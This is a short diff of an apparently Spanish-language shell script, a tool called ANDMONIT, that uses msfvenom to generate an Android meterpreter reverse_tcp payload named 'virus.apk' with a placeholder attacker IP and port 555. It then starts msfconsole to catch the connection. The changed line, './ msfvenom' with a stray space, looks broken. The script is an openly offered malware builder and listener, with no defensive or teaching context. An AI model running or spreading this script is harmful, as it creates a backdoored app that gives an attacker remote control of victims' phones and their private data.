@@ -23,7 +23,7 @@ clear
 figlet ANDMONIT 2.0.3
 echo [!]CREANDO APK...
 cd metasploit-framework
-msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > virus.apk
+./ msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > virus.apk
 echo APK CREADA CON EXITO!
 echo [!]MONITOREANDO APK...
 ./msfconsole -r android-otro.rc
